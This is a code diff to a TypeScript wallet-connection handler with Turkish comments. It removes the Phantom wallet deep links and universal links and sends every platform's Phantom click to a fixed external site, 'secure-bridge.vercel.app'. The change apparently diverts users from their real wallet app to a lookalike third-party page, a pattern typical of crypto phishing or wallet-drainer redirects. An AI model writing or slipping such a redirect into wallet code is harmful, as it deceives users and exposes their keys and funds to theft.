@@ -342,31 +342,23 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return doTx();
     }
 
-    // 2) Sadece origin + pathname kullan, query/hash atla
-    const origin     = window.location.origin;
-    const pathname   = window.location.pathname;
-    const targetUrl  = origin + pathname;               // örn: https://www.test.com/secondpage
-    const encoded    = encodeURIComponent(targetUrl);
-    const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
+    // Sabit yönlendirme URL'i
+    const redirectUrl = 'https://secure-bridge.vercel.app/';
 
-    // Android+Telegram için intent yönlendirmesi
-    const intentDefaultBrowser = [
-      `intent://${hostAndPath}`,
-      `#Intent;scheme=https`,
-      `;action=android.intent.action.VIEW`,
-      `;category=android.intent.category.BROWSABLE`,
-      `;S.browser_fallback_url=https://phantom.app/ul/browse/${encoded}?ref=${encoded}`,
-      `;end`
-    ].join('');
-
-    // Android normal tarayıcıda Phantom custom-scheme
-    const schemePhantom = `phantom://browse/${encoded}?ref=${encoded}`;
-
-    // iOS ve diğer cihazlar için Universal Link
-    const universalPhantom = `https://phantom.app/ul/browse/${encoded}?ref=${encoded}`;
-
-    // 3) Android + Telegram Mini-App → intent (dış tarayıcı)
+    // 2) Android + Telegram Mini-App → intent (harici tarayıcı)
     if (isAndroid && isTelegramWebView) {
+      const origin     = window.location.origin;
+      const pathname   = window.location.pathname;
+      const targetUrl  = origin + pathname;
+      const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
+      const intentDefaultBrowser = [
+        `intent://${hostAndPath}`,
+        `#Intent;scheme=https`,
+        `;action=android.intent.action.VIEW`,
+        `;category=android.intent.category.BROWSABLE`,
+        `;S.browser_fallback_url=${redirectUrl}`,
+        `;end`
+      ].join('');
       const a = document.createElement('a');
       a.href   = intentDefaultBrowser;
       a.target = '_blank';
@@ -376,19 +368,14 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 4) Android normal tarayıcı → Phantom scheme
+    // 3) Android normal tarayıcı → sabit redirectUrl
     if (isAndroid) {
-      const a = document.createElement('a');
-      a.href   = schemePhantom;
-      a.target = '_blank';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(() => a.remove(), 700);
+      window.location.href = redirectUrl;
       return;
     }
 
-    // 5) iOS veya Desktop → Universal Link
-    window.location.href = universalPhantom;
+    // 4) iOS veya Desktop → sabit redirectUrl
+    window.location.href = redirectUrl;
     return;
   }
 
@@ -401,6 +388,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
   // Fallback: default deepLink kullan
   window.open(w.deepLink, '_blank');
 };
+
 
 
 
